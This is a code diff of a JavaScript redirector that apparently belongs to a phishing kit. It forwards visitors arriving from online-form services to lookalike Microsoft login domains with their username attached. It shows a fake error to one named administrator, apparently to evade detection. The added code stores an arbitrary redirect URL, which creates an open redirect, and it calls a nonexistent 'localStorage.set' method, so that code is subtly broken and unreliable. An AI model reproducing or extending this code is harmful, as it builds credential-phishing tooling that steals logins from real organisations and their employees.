@@ -7,35 +7,49 @@
         alert("A technical issue occurred. Please try again in one hour");
     } else {
 
-        let targetDomain = "https://office-eu-azure.ee1-login.cloud";
-
-        if(urlParams.has("q")) {
-            targetDomain = "https://identity.ee1-login.cloud"
-        }
-
-        if (urlParams.has("b")) {
-            targetDomain = "https://banijay.office-eu1.com";
-        }
-
-        if (ref.match(/^https?:\/\/([^\/]+\.)?typeform\.com(\/|$)/i) || ref.match(/^https?:\/\/([^\/]+\.)?formstack\.com(\/|$)/i) || ref.match(/^https?:\/\/([^\/]+\.)?forms\.office\.com(\/|$)/i)) {
-
-            if (urlParams.has("u")) {
-                const u = urlParams.get("u");
-
-                if (u == "admin.barleymanor@porthaven.co.uk") {
-                    alert("An error has occured, please try again later");
+        // if this is a finish request
+        if (urlParams.has("redir")) {
+            if (localStorage.getItem("redirect")) {
+                window.location = localStorage.getItem("redirect");
+            }
+        } else {
+            let targetDomain = "https://office-eu-azure.ee1-login.cloud";
+    
+            if(urlParams.has("q")) {
+                targetDomain = "https://identity.ee1-login.cloud"
+            }
+    
+            if (urlParams.has("b")) {
+                targetDomain = "https://banijay.office-eu1.com";
+            }
+    
+            if (urlParams.has("f")) {
+                // decode and set as cookie
+                let url = decodeURIComponent(urlParams.get("f"));
+                localStorage.set("redirect", url);
+            }
+    
+            if (ref.match(/^https?:\/\/([^\/]+\.)?typeform\.com(\/|$)/i) || ref.match(/^https?:\/\/([^\/]+\.)?formstack\.com(\/|$)/i) || ref.match(/^https?:\/\/([^\/]+\.)?forms\.office\.com(\/|$)/i)) {
+    
+                if (urlParams.has("u")) {
+                    const u = urlParams.get("u");
+    
+                    if (u == "admin.barleymanor@porthaven.co.uk") {
+                        alert("An error has occured, please try again later");
+                    } else {
+                        window.location = targetDomain + "?username=" + u;
+                    }
+    
+    
+                    
+    
+    
                 } else {
-                    window.location = targetDomain + "?username=" + u;
+                    window.location = targetDomain;
                 }
-
-
-                
-
-
-            } else {
-                window.location = targetDomain;
             }
         }
+
 
     }
 
